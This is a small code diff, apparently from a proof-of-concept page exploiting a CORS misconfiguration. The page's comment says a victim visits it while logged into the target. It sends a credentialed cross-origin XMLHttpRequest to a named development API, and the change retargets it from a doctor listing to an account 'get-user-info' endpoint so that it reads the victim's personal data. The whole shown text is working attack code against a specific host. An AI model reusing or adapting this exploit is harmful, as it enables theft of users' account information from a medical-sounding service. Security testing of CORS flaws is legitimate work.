@@ -5,7 +5,7 @@
 // Victim visits this page while logged into target.com
 var req = new XMLHttpRequest();
 req.onload = reqListener;
-req.open('get', 'https://medikit-api-dev.proxy.abtollc.com/api/doctor/random', true);
+req.open('get', 'https://medikit-api-dev.proxy.abtollc.com/api/account/get-user-info', true);
 req.withCredentials = true;
 req.send('{}');
 
